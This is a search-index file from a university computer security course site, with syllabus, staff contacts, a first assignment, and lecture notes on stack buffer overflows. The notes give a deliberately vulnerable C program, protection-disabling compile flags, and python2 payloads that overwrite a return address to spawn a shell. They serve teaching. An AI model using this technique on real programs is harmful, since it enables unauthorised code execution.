{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"This course focuses on computer security, covering a wide range of topics on both the \"defensive\" and \"offensive\" side of this field. Among these will be systems security and exploitation (buffer overflows, race conditions, SQL injection, etc), access control and authentication, covert channels, network security, language-based security, denial-of-service, privacy and anonymity. The goal of the course is to provide an appreciation of how to think adversarially with respect to computer systems as well as an appreciation of how to reason about attacks and defenses. To complete the projects in this course, you will need the ability to develop software programs using the C language, and some understanding of x86 assembly, JavaScript, PHP and SQL. We will not reach these in class and you will be expected to learn them on your own. If you don't know C, K&R's The C Programming Language is a great go to, but the Hacking book is probably enough and covers some x86 assembly too. Class details \u00b6 Lectures: Mondays and Wednesdays, 5pm - 6:20pm in CENTR 109 Section: Fridays, 2pm-2:50pm in CENTR 216 Piazza: https://piazza.com/ucsd/winter2020/cse127/home Gradescope https://www.gradescope.com/courses/79259 Access Code: 9J8GW6 Textbook \u00b6 We will occasionally be assinging readings from Ross Anderson's Security Engineering and various other online resources and papers. We may also assign optional reading from Jon Erickson's Hacking: The Art of Exploitation . Grading \u00b6 40% Assignments 25% Midterm exam 35% Final exam \u226410% Participation in class and online Programming assignments \u00b6 We will have assignments that are meant to both reinforce your knowledge of the concepts covered in lecture and get you to think about security in more depth, beyond what is covered lecture. You are expected to work on the assignments by yourself. You may discuss the assignments with students from the course, in general, but not any specific solution. There are no late days, but you will receive an additional 10% if you turn in your assignment by the early date. If you consult anything (books, academic papers, internet resources, people not in your group) when working on the assignments, note this in your submission. We encourage outside learning but expect you to not seek out specific details about a solution -- anything submitted should be considered your own work. Similarly, you are expected to not publish or otherwise share your solutions at any point (even after the class is over). If you are unsure about what is allowed, please ask the course staff. Exams \u00b6 The midterm is closed-book , but you may use a double-sided cheat sheet (letter-size). The final is closed-book , but you may use 2 double-sided cheat sheets (letter-size). The exams will make up 60% of your grade. Since the final is cumulative your midterm grade will be calculated as: midterm > 0 ? max(final, midterm) : 0 This means that (1) you basically get a second chance if you don't so well on the midterm and (2) you must show up to both the midterm and the final. If you need to miss either exam because of a documented medical emergency, contact the instructor immediately. Participation/pre-lecture readings \u00b6 Before each class there will be some assigned reading. You are expected to do the reading and have at least a vague understanding of the concepts that will be discussed in class. This will allow us to spend the lecture time to solidify your understanding. Asking and answering questions in class, on Piazza, or during office hours counts towards your class participation. Contributing to the class lecture notes will similarly be rewarded with extra points. Acknowledgements \u00b6 The course structure and many of the ideas and slides are influenced or directly from other courses taught at Berkeley ( David Wagner and Raluca Popa ), Oberlin ( Stephen Checkoway ), Stanford ( Dan Boneh , John Mitchell , and Zakir Durumeric ), UT Austin ( Hovav Shacham ), UCSD ( Stefan Savage , Nadia Heninger ) and UIUC ( Kirill Levchenko ). (If we're missing anybody please let us know!) Academic integrity and student conduct \u00b6 By taking this course, you implicitly agree to abide by the UCSD policies on Integrity of Scholarship and Student Conduct . University rules on integrity of scholarship and code of conduct are taken seriously and will be enforced.","title":"About"},{"location":"#class-details","text":"Lectures: Mondays and Wednesdays, 5pm - 6:20pm in CENTR 109 Section: Fridays, 2pm-2:50pm in CENTR 216 Piazza: https://piazza.com/ucsd/winter2020/cse127/home Gradescope https://www.gradescope.com/courses/79259 Access Code: 9J8GW6","title":"Class details"},{"location":"#textbook","text":"We will occasionally be assinging readings from Ross Anderson's Security Engineering and various other online resources and papers. We may also assign optional reading from Jon Erickson's Hacking: The Art of Exploitation .","title":"Textbook"},{"location":"#grading","text":"40% Assignments 25% Midterm exam 35% Final exam \u226410% Participation in class and online","title":"Grading"},{"location":"#programming-assignments","text":"We will have assignments that are meant to both reinforce your knowledge of the concepts covered in lecture and get you to think about security in more depth, beyond what is covered lecture. You are expected to work on the assignments by yourself. You may discuss the assignments with students from the course, in general, but not any specific solution. There are no late days, but you will receive an additional 10% if you turn in your assignment by the early date. If you consult anything (books, academic papers, internet resources, people not in your group) when working on the assignments, note this in your submission. We encourage outside learning but expect you to not seek out specific details about a solution -- anything submitted should be considered your own work. Similarly, you are expected to not publish or otherwise share your solutions at any point (even after the class is over). If you are unsure about what is allowed, please ask the course staff.","title":"Programming assignments"},{"location":"#exams","text":"The midterm is closed-book , but you may use a double-sided cheat sheet (letter-size). The final is closed-book , but you may use 2 double-sided cheat sheets (letter-size). The exams will make up 60% of your grade. Since the final is cumulative your midterm grade will be calculated as: midterm > 0 ? max(final, midterm) : 0 This means that (1) you basically get a second chance if you don't so well on the midterm and (2) you must show up to both the midterm and the final. If you need to miss either exam because of a documented medical emergency, contact the instructor immediately.","title":"Exams"},{"location":"#participationpre-lecture-readings","text":"Before each class there will be some assigned reading. You are expected to do the reading and have at least a vague understanding of the concepts that will be discussed in class. This will allow us to spend the lecture time to solidify your understanding. Asking and answering questions in class, on Piazza, or during office hours counts towards your class participation. Contributing to the class lecture notes will similarly be rewarded with extra points.","title":"Participation/pre-lecture readings"},{"location":"#acknowledgements","text":"The course structure and many of the ideas and slides are influenced or directly from other courses taught at Berkeley ( David Wagner and Raluca Popa ), Oberlin ( Stephen Checkoway ), Stanford ( Dan Boneh , John Mitchell , and Zakir Durumeric ), UT Austin ( Hovav Shacham ), UCSD ( Stefan Savage , Nadia Heninger ) and UIUC ( Kirill Levchenko ). (If we're missing anybody please let us know!)","title":"Acknowledgements"},{"location":"#academic-integrity-and-student-conduct","text":"By taking this course, you implicitly agree to abide by the UCSD policies on Integrity of Scholarship and Student Conduct . University rules on integrity of scholarship and code of conduct are taken seriously and will be enforced.","title":"Academic integrity and student conduct"},{"location":"contact/","text":"For general information and questions, please post to the class Piazza . It's very likely that other students will have the same question. We will post announcements on Piazza, so please make sure to sign up. For urgent or personal matters, please post a private question. Instructor \u00b6 Name: Deian Stefan Email: deian+cse127@cs.ucsd.edu Address: 3126 EBU3B Office Hours: Wednesday 3:00-4:00pm in 3126 EBU3B Teaching Assistants \u00b6 Name: Sunjay Cauligi Office Hours: Tuesday 4:00-5:00pm in B215 EBU3B Name: Riley Hadden Office Hours: Thursday 3:30-4:30pm in B275 EBU3B Name: Zaki Siddiqui Office Hours: Monday 1:00-2:00pm in B270A EBU3B","title":"Contact Info and Office Hours"},{"location":"contact/#instructor","text":"Name: Deian Stefan Email: deian+cse127@cs.ucsd.edu Address: 3126 EBU3B Office Hours: Wednesday 3:00-4:00pm in 3126 EBU3B","title":"Instructor"},{"location":"contact/#teaching-assistants","text":"Name: Sunjay Cauligi Office Hours: Tuesday 4:00-5:00pm in B215 EBU3B Name: Riley Hadden Office Hours: Thursday 3:30-4:30pm in B275 EBU3B Name: Zaki Siddiqui Office Hours: Monday 1:00-2:00pm in B270A EBU3B","title":"Teaching Assistants"},{"location":"syllabus/","text":"Date Topics Jan 6 Intro/Threat Modeling Optional reading: James Mickens' This World of Ours and USENIX Security 2018 Keynote Assignment 1: Intro Jan 8 Buffer overflow attacks Reading: Aleph One's Smashing the Stack for Fun and Profit Optional reading: 0x300-0x320 from Hacking. 0x200-0x270 if you don't have a strong C background. Jan 13 Buffer overflow defenses (Stack canaries/W^X/ASLR) Reading: Eternal War in Memory by Szekeres et al., ASLR , and NOEXEC Assignment 2: Buffer overflows Jan 15 More memory safety attacks and defenses Reading: The Geometry of Innocent Flesh on the Bone:Return-into-libc without Function Calls (on the x86) by Shacham and Control-Flow Integrity by Abadi et al. Jan 20 Martin Luther King, Jr. Holiday Jan 22 OS Security/Isolation Assignment 3: Side channels Jan 27 Web security model Jan 29 Web attacks and defenses Assignment 4: Web Feb 3 Modern client-side web defenses Feb 5 Network intro Feb 10 Midterm Feb 12 Network attacks Assignment 5: Networks Feb 17 Presidents' Day Holiday Feb 19 Network defenses Feb 24 Symmetric-key crypto Feb 26 Public-key crypto Mar 2 TLS and PKI Mar 5 Side channels Assignment 6: Crypto Mar 9 Privacy/Anonymity Mar 11 Guest lecture","title":"Syllabus"},{"location":"notes/bufferoverflow/","text":"We're going to walk through the example from class, carrying out a simple stack buffer overflow attack. To get started, create a file called example2.c with the example code: #include <stdio.h> #include <stdlib.h> #include <string.h> void bar () { system ( \"/bin/sh\" ); } void foo () { printf ( \"hello all!! \\n \" ); exit ( 0 ); } void func ( int a , int b , char * str ) { int c = 0xdeadbeef ; char buf [ 4 ]; strcpy ( buf , str ); } int main ( int argc , char ** argv ) { func ( 0xaaaaaaaa , 0xbbbbbbbb , argv [ 1 ]); return 0 ; } Then compile the program with GCC: gcc -m32 -O0 -ggdb -static -U_FORTIFY_SOURCE -fno-stack-protector -zexecstack -no-pie -o example2 example2.c You'll note that we compiled this program with a bunch of flags. These flags disable many protection mechanism that would make such an attack harder to carry out. We'll see in class what most of these are. Code and environment inspection \u00b6 Our first goal is to manually modify the stack frames to change the return address in fun to jump (when it returns) to the beginning of foo , instead of returning back to main . To get started, let's start GDB: $ gdb example2 Within GDB let's set a breakpoint on func and run the program with argument \"AAAA\" : > b func > set args \"AAAA\" > r To figure out where to jump to, let's first look at the what's on the stack frame: Recall that the first argument is off by 8: > x $ebp+8 0xffffced0: 0xaaaaaaaa The second argument is at offset 12: > x $ebp+12 0xffffced4: 0xbbbbbbbb The old $ebp is at offset 0: > x $ebp 0xffffcec8: 0xffffcee8 If our function returns normally, the $ebp will be set to 0xffffcee8 . If you want to see this, set a breakpoint right after the strcpy ( b 17 ), continue ( c in GDB) and then step through ( s ). You can also stop at the exact leave instruction by setting a break point at the address: > b *0x8049c1e You can find such addresses with disas : > disas func Dump of assembler code for function func: 0x08049bee <+0>: push %ebp 0x08049bef <+1>: mov %esp,%ebp 0x08049bf1 <+3>: push %ebx 0x08049bf2 <+4>: sub $0x14,%esp 0x08049bf5 <+7>: call 0x8049c68 <__x86.get_pc_thunk.ax> 0x08049bfa <+12>: add $0x96406,%eax 0x08049bff <+17>: movl $0xdeadbeef,-0xc(%ebp) 0x08049c06 <+24>: sub $0x8,%esp 0x08049c09 <+27>: pushl 0x10(%ebp) 0x08049c0c <+30>: lea -0x10(%ebp),%edx 0x08049c0f <+33>: push %edx 0x08049c10 <+34>: mov %eax,%ebx 0x08049c12 <+36>: call 0x8049028 0x08049c17 <+41>: add $0x10,%esp 0x08049c1a <+44>: nop 0x08049c1b <+45>: mov -0x4(%ebp),%ebx 0x08049c1e <+48>: leave 0x08049c1f <+49>: ret End of assembler dump. NOTE: This address will likely be different on your machine. Where is the return address? It's 4 off the $ebp : > x $ebp+4 0xffffcecc: 0x08049c58 Now what is this 0x08049c58 value? It's the address in main right after the call to func ( which is at address 0x8039bee ): > disas main Dump of assembler code for function main: 0x08049c20 <+0>: lea 0x4(%esp),%ecx ... 0x08049c53 <+51>: call 0x8049bee <func> 0x08049c58 <+56>: add $0x10,%esp ... End of assembler dump. Great. Now to to direct the control flow to foo instead of back to main we just need to overwrite the return address. We can do this by setting $ebp+4 : We can do this by getting foo 's address: > p &foo $2 = (void (*)()) 0x8049bc0 <foo> > set {int}($ebp+4)=0x8049bc0 Or more simply: > set {int}($ebp+4)=&foo Now if you continue ( c ) the ret will jump to 0x8049bc0 and print: hello all!! As an attacker, we need to overflow the buffer to write the return address though. We can't attach GDB to a process we don't control. Overflowing the buffer \u00b6 So, let's overflow the buffer. To see the effects of the overflow make sure you set the breakpoint after strcpy and let's change the args to go just past buf 4-byte boundary: > b 17 > set args > set args \"AAAABC\" > r If you print the local variable c before and after the strcpy you'll see that we've overflow from buf into c : > p c $14 = 0xdeadbeef > c > p c $15 = 0xde004342 You'll notice that c changed from 0xdeadbeef to 0xde004242 , i.e., 0xde\"\\0CB\" . If we then change the args to \"AAAABCD\" you'll see that c = 0x00444342 . But we need to overflow the return address. How do we figure out how much we need to overflow? Compute the distance between the return address and buffer start. In func : > p $ebp+4-&buf[0] $16 = 0x14 This means that we need to supply an arugment that is 20 bytes long (0x14) to get up to the return address. Let's do that: > set args \"AAAABBBBCCCCDDDDEEEEFFFF\" > r Now if you inspect the contents of the return addresss (after strcpy ) you'll see it filled with all F s: > x $ebp+4 0xffffcebc: 0x46464646 If you let this program continue it will crash with: Cannot access memory at address 0x46464646 Why? We'll we're trying to read the instruction at address 0x46464646 to execute it. That's not a valid address. Let's instead point the program to foo ( 0x8049bc0 ): > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\") > r Now if you run the program it will print hello all . We can do all of this from the shell: $ ./example2 ` python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\" ` hello all!! In practice you'll want to get a shell. In our example we can get a shell by setting the return address to bar : > p &bar $35 = (void (*)()) 0x8049b95 <bar> > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\x95\\x9b\\x04\\x08'\") > r sh-5.0$ Realistically you won't have a nice function like bar in the process and you'll need to essentially mock a call to system yourself. You can do this by overflowing the buffer with your (shell) code and have the return address point to your code instead of existing functions. You'll get to do this in one of you assignments! GEF \u00b6 You may find GEF helpful throught the quarter. I like ATT synax for x86: set disassembly-flavor att and like the stack growing downwards to match slides ( gef config context.grow_stack_down True ).","title":"Stack smashing"},{"location":"notes/bufferoverflow/#code-and-environment-inspection","text":"Our first goal is to manually modify the stack frames to change the return address in fun to jump (when it returns) to the beginning of foo , instead of returning back to main . To get started, let's start GDB: $ gdb example2 Within GDB let's set a breakpoint on func and run the program with argument \"AAAA\" : > b func > set args \"AAAA\" > r To figure out where to jump to, let's first look at the what's on the stack frame: Recall that the first argument is off by 8: > x $ebp+8 0xffffced0: 0xaaaaaaaa The second argument is at offset 12: > x $ebp+12 0xffffced4: 0xbbbbbbbb The old $ebp is at offset 0: > x $ebp 0xffffcec8: 0xffffcee8 If our function returns normally, the $ebp will be set to 0xffffcee8 . If you want to see this, set a breakpoint right after the strcpy ( b 17 ), continue ( c in GDB) and then step through ( s ). You can also stop at the exact leave instruction by setting a break point at the address: > b *0x8049c1e You can find such addresses with disas : > disas func Dump of assembler code for function func: 0x08049bee <+0>: push %ebp 0x08049bef <+1>: mov %esp,%ebp 0x08049bf1 <+3>: push %ebx 0x08049bf2 <+4>: sub $0x14,%esp 0x08049bf5 <+7>: call 0x8049c68 <__x86.get_pc_thunk.ax> 0x08049bfa <+12>: add $0x96406,%eax 0x08049bff <+17>: movl $0xdeadbeef,-0xc(%ebp) 0x08049c06 <+24>: sub $0x8,%esp 0x08049c09 <+27>: pushl 0x10(%ebp) 0x08049c0c <+30>: lea -0x10(%ebp),%edx 0x08049c0f <+33>: push %edx 0x08049c10 <+34>: mov %eax,%ebx 0x08049c12 <+36>: call 0x8049028 0x08049c17 <+41>: add $0x10,%esp 0x08049c1a <+44>: nop 0x08049c1b <+45>: mov -0x4(%ebp),%ebx 0x08049c1e <+48>: leave 0x08049c1f <+49>: ret End of assembler dump. NOTE: This address will likely be different on your machine. Where is the return address? It's 4 off the $ebp : > x $ebp+4 0xffffcecc: 0x08049c58 Now what is this 0x08049c58 value? It's the address in main right after the call to func ( which is at address 0x8039bee ): > disas main Dump of assembler code for function main: 0x08049c20 <+0>: lea 0x4(%esp),%ecx ... 0x08049c53 <+51>: call 0x8049bee <func> 0x08049c58 <+56>: add $0x10,%esp ... End of assembler dump. Great. Now to to direct the control flow to foo instead of back to main we just need to overwrite the return address. We can do this by setting $ebp+4 : We can do this by getting foo 's address: > p &foo $2 = (void (*)()) 0x8049bc0 <foo> > set {int}($ebp+4)=0x8049bc0 Or more simply: > set {int}($ebp+4)=&foo Now if you continue ( c ) the ret will jump to 0x8049bc0 and print: hello all!! As an attacker, we need to overflow the buffer to write the return address though. We can't attach GDB to a process we don't control.","title":"Code and environment inspection"},{"location":"notes/bufferoverflow/#overflowing-the-buffer","text":"So, let's overflow the buffer. To see the effects of the overflow make sure you set the breakpoint after strcpy and let's change the args to go just past buf 4-byte boundary: > b 17 > set args > set args \"AAAABC\" > r If you print the local variable c before and after the strcpy you'll see that we've overflow from buf into c : > p c $14 = 0xdeadbeef > c > p c $15 = 0xde004342 You'll notice that c changed from 0xdeadbeef to 0xde004242 , i.e., 0xde\"\\0CB\" . If we then change the args to \"AAAABCD\" you'll see that c = 0x00444342 . But we need to overflow the return address. How do we figure out how much we need to overflow? Compute the distance between the return address and buffer start. In func : > p $ebp+4-&buf[0] $16 = 0x14 This means that we need to supply an arugment that is 20 bytes long (0x14) to get up to the return address. Let's do that: > set args \"AAAABBBBCCCCDDDDEEEEFFFF\" > r Now if you inspect the contents of the return addresss (after strcpy ) you'll see it filled with all F s: > x $ebp+4 0xffffcebc: 0x46464646 If you let this program continue it will crash with: Cannot access memory at address 0x46464646 Why? We'll we're trying to read the instruction at address 0x46464646 to execute it. That's not a valid address. Let's instead point the program to foo ( 0x8049bc0 ): > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\") > r Now if you run the program it will print hello all . We can do all of this from the shell: $ ./example2 ` python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\" ` hello all!! In practice you'll want to get a shell. In our example we can get a shell by setting the return address to bar : > p &bar $35 = (void (*)()) 0x8049b95 <bar> > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\x95\\x9b\\x04\\x08'\") > r sh-5.0$ Realistically you won't have a nice function like bar in the process and you'll need to essentially mock a call to system yourself. You can do this by overflowing the buffer with your (shell) code and have the return address point to your code instead of existing functions. You'll get to do this in one of you assignments!","title":"Overflowing the buffer"},{"location":"notes/bufferoverflow/#gef","text":"You may find GEF helpful throught the quarter. I like ATT synax for x86: set disassembly-flavor att and like the stack growing downwards to match slides ( gef config context.grow_stack_down True ).","title":"GEF"},{"location":"pa/pa1/","text":"Assignment 1 (20 pts) \u00b6 Deadline: January 15, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 12, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to become familiar with the setup that will be used for future assignments, such as the use of a virtual machine and the included turn-in script, as well as the basics of working with gdb and writing programs in x86 assembly. Getting Started \u00b6 To complete this assignment, you will be provided with a VirtualBox VM pre-populated with the assignment files. VM Image \u00b6 In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we provide, named pa1box . You can download the VM image here . The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . The VM is configured with SSH on port 2222. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. To SSH into the VM: ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path Part 1: Using GDB (10 pts) \u00b6 Files for this sub-assignment are located in the gdb subdirectory of the student user's home directory in the VM image; that is, /home/student/gdb . SSH into the VM and cd into that directory to begin working on it. Inside the gdb directory, you'll find fib.c , a C program demonstrating the Fibonacci sequence; a Makefile ; and hw1.txt , in which you'll record your responses to the questions below. The first step is to compile fib by running make on the command line. To run the fib executable in GDB, run gdb fib . I recommend the following workflow in GDB: Starting. Set breakpoints that you can later use for analysis: b foo \u2014 break at function foo b *0x08048489 \u2014 break at the instruction at address 0x08048489 r \u2014 run the executable Analyzing. Examine memory, registers, etc; disassemble code; show stack frames, backtrace, etc; and more: disas foo \u2014 disassemble function foo i r \u2014 view registers where \u2014 view stack frames x <loc> \u2014 examine memory x $eip \u2014 examine current instruction pointer x /10x $esp \u2014 examine 10 words at top of stack x /10x buf \u2014 examine 10 words in buf x /10i $eip \u2014 examine 10 instructions starting at instruction pointer x /10i foo \u2014 examine 10 instructions starting at foo Continuing. Continue analysis: c \u2014 continue execution until next breakpoint/watchpoint si \u2014 step to the next instruction s \u2014 step to the next line of source code Note that this is only a cursory overview of GDB; much more info is available from online resources. Assignment Instructions \u00b6 Complete the following exercises and fill out hw1.txt with your answers. Follow the directions in the template, do not delete the square brackets What is the value, in hex, of the ecx register when the function f is called? (2 pts) Which register stores the value of the variable i in the function main? (2 pts) What is the address, in hex, of the function f ? (2 pts) What is the name of the 6th instruction of the function f ? (2 pts) When f completes after being called from main , to which address in main does control return? Write your answer in hex form. (2 pts) Submission \u00b6 Submit hw1.txt to \"1a. gdb\" on Gradescope. Gradescope will check that it has successfully detected your answers, but it will not give you your grade until the due date. Part 2: echo in x86 (10 pts) \u00b6 Files for this sub-assignment are located in the x86 subdirectory of the student user's home directory in the VM image; that is, /home/student/x86 . SSH into the VM and cd into that directory to begin working on it. For this part, you will be implementing a simplified version of the familiar echo command, using raw x86 assembly code. The goal of this assignment is to familiarize you with writing programs directly in x86. Your echo command must behave as follows: When run with a single command line argument (e.g., ./echo Hello ): Prints that argument back to the console's standard output (stdout). Prints a trailing newline ( \\n ). Exits with code 0. When run with too few command line arguments (e.g., ./echo ) or too many (e.g., ./echo Hello World ): Prints exactly the error message This command expects exactly one argument. \u2014 followed by a trailing newline ( \\n ) \u2014 to the console's standard error (stderr). Exits with code 1. Your code should be written in the file echo.s inside the x86 directory. A heavily-commented example echo.s is provided, which simply prints the message Hello World (followed by a trailing newline) to stdout. Your job is to modify this program to meet the specification for echo above. A Makefile is included, so you can build the echo binary by running make from the command line. Helpful Hints \u00b6 In a Linux program, stdout is file descriptor number 1 and stderr is number 2. Linux programs start with argc at the top of the stack, accessible at 0(%esp) from x86-assembly programs. Below it is argv , the array of pointers to (null-terminated) strings passed into the program as arguments. So argv[0] can be accessed from x86-assembly programs at 4(%esp) , argv[1] at 8(%esp) , argv[2] at 12(%esp) , and so on. argv[0] is the name of the program executed, not the first argument, which is argv[1] if supplied (or 8(%esp) for our purposes). Then argc (or 0(%esp) ) will be 1 if the program was not passed any arguments, 2 if it was passed 1 argument, and so on. This table of Linux system calls may come in handy. Submission \u00b6 Submit echo.s to \"1b. x86 echo\" on Gradescope.","title":"Assignment 1"},{"location":"pa/pa1/#assignment-1-20-pts","text":"Deadline: January 15, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 12, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to become familiar with the setup that will be used for future assignments, such as the use of a virtual machine and the included turn-in script, as well as the basics of working with gdb and writing programs in x86 assembly.","title":"Assignment 1 (20 pts)"},{"location":"pa/pa1/#getting-started","text":"To complete this assignment, you will be provided with a VirtualBox VM pre-populated with the assignment files.","title":"Getting Started"},{"location":"pa/pa1/#vm-image","text":"In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we provide, named pa1box . You can download the VM image here . The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . The VM is configured with SSH on port 2222. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. To SSH into the VM: ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path","title":"VM Image"},{"location":"pa/pa1/#part-1-using-gdb-10-pts","text":"Files for this sub-assignment are located in the gdb subdirectory of the student user's home directory in the VM image; that is, /home/student/gdb . SSH into the VM and cd into that directory to begin working on it. Inside the gdb directory, you'll find fib.c , a C program demonstrating the Fibonacci sequence; a Makefile ; and hw1.txt , in which you'll record your responses to the questions below. The first step is to compile fib by running make on the command line. To run the fib executable in GDB, run gdb fib . I recommend the following workflow in GDB: Starting. Set breakpoints that you can later use for analysis: b foo \u2014 break at function foo b *0x08048489 \u2014 break at the instruction at address 0x08048489 r \u2014 run the executable Analyzing. Examine memory, registers, etc; disassemble code; show stack frames, backtrace, etc; and more: disas foo \u2014 disassemble function foo i r \u2014 view registers where \u2014 view stack frames x <loc> \u2014 examine memory x $eip \u2014 examine current instruction pointer x /10x $esp \u2014 examine 10 words at top of stack x /10x buf \u2014 examine 10 words in buf x /10i $eip \u2014 examine 10 instructions starting at instruction pointer x /10i foo \u2014 examine 10 instructions starting at foo Continuing. Continue analysis: c \u2014 continue execution until next breakpoint/watchpoint si \u2014 step to the next instruction s \u2014 step to the next line of source code Note that this is only a cursory overview of GDB; much more info is available from online resources.","title":"Part 1: Using GDB (10 pts)"},{"location":"pa/pa1/#assignment-instructions","text":"Complete the following exercises and fill out hw1.txt with your answers. Follow the directions in the template, do not delete the square brackets What is the value, in hex, of the ecx register when the function f is called? (2 pts) Which register stores the value of the variable i in the function main? (2 pts) What is the address, in hex, of the function f ? (2 pts) What is the name of the 6th instruction of the function f ? (2 pts) When f completes after being called from main , to which address in main does control return? Write your answer in hex form. (2 pts)","title":"Assignment Instructions"},{"location":"pa/pa1/#submission","text":"Submit hw1.txt to \"1a. gdb\" on Gradescope. Gradescope will check that it has successfully detected your answers, but it will not give you your grade until the due date.","title":"Submission"},{"location":"pa/pa1/#part-2-echo-in-x86-10-pts","text":"Files for this sub-assignment are located in the x86 subdirectory of the student user's home directory in the VM image; that is, /home/student/x86 . SSH into the VM and cd into that directory to begin working on it. For this part, you will be implementing a simplified version of the familiar echo command, using raw x86 assembly code. The goal of this assignment is to familiarize you with writing programs directly in x86. Your echo command must behave as follows: When run with a single command line argument (e.g., ./echo Hello ): Prints that argument back to the console's standard output (stdout). Prints a trailing newline ( \\n ). Exits with code 0. When run with too few command line arguments (e.g., ./echo ) or too many (e.g., ./echo Hello World ): Prints exactly the error message This command expects exactly one argument. \u2014 followed by a trailing newline ( \\n ) \u2014 to the console's standard error (stderr). Exits with code 1. Your code should be written in the file echo.s inside the x86 directory. A heavily-commented example echo.s is provided, which simply prints the message Hello World (followed by a trailing newline) to stdout. Your job is to modify this program to meet the specification for echo above. A Makefile is included, so you can build the echo binary by running make from the command line.","title":"Part 2: echo in x86 (10 pts)"},{"location":"pa/pa1/#helpful-hints","text":"In a Linux program, stdout is file descriptor number 1 and stderr is number 2. Linux programs start with argc at the top of the stack, accessible at 0(%esp) from x86-assembly programs. Below it is argv , the array of pointers to (null-terminated) strings passed into the program as arguments. So argv[0] can be accessed from x86-assembly programs at 4(%esp) , argv[1] at 8(%esp) , argv[2] at 12(%esp) , and so on. argv[0] is the name of the program executed, not the first argument, which is argv[1] if supplied (or 8(%esp) for our purposes). Then argc (or 0(%esp) ) will be 1 if the program was not passed any arguments, 2 if it was passed 1 argument, and so on. This table of Linux system calls may come in handy.","title":"Helpful Hints"},{"location":"pa/pa1/#submission_1","text":"Submit echo.s to \"1b. x86 echo\" on Gradescope.","title":"Submission"}]}